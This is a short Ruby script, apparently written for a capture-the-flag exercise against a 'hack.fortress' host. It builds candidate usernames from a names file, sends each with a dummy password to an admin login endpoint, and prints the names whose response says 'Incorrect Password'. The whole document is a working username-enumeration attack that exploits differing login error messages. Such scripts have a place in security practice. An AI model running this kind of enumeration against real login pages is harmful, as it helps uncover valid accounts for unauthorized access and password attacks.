require 'pp'
require 'net/http'
n = File.read 'names.csv'

usernames = n.lines.map do |n|
  s = n.split
  name = (s[0][0] + s[1]).downcase
end

urls = usernames.map do |n|
  u = URI.parse "http://chipcorp.hack.fortress/simple_admin.py?username=#{n}&password=butts"
  r = Net::HTTP.get u
  # $stderr.puts r
  puts n if r =~ /Incorrect Password/
end
